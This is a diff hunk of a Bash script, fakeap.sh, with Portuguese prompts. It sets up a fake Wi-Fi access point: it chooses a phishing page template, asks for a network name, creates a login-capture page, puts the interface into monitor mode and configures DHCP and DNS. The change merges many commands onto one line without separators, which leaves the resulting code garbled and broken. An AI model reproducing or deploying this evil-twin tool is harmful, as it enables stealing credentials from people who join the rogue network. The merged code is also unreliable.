@@ -79,17 +79,7 @@ start() {
   list_folders
   read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha um número de pasta:\e[0m ' folder_number
   use_site="sites/$(ls sites | sed -n "${folder_number}p")"
-  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Nome da rede (SSID) a ser usado:\e[0m ' use_ssid
-  extract_login_info
-  createpage
-  stop
-  sleep 2
-  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o ponto de acesso..\e[0m\n" 
-  sleep 2
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Desativando %s\n" "$choosed_interface"
-  ip link set "$choosed_interface" down
-  sleep 2
-  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para o modo monitor\n" "$choosed_interface" iw dev "$choosed_interface" set type monitor sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ativando %s\n" "$choosed_interface" ip link set "$choosed_interface" up sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface %s configurada com sucesso\n" "$choosed_interface" sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\e[0m\n" sleep 2 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para parar: ./fakeap.sh --stop\n" sleep 2 server }case "$1" in --stop) stop ;; 
+  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Nome da rede (SSID) a ser usado:\e[0m ' use_ssid extract_login_info createpage stop sleep 2 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o ponto de acesso..\e[0m\n" sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Desativando %s\n" "$choosed_interface" ip link set "$choosed_interface" down sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para o modo monitor\n" "$choosed_interface" iw dev "$choosed_interface" set type monitor sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Ativando %s\n" "$choosed_interface" ip link set "$choosed_interface" up sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface %s configurada com sucesso\n" "$choosed_interface" sleep 2 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\e[0m\n" sleep 2 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para parar: ./fakeap.sh --stop\n" sleep 2 server }case "$1" in --stop) stop ;; 
   *)
   start
   ;;
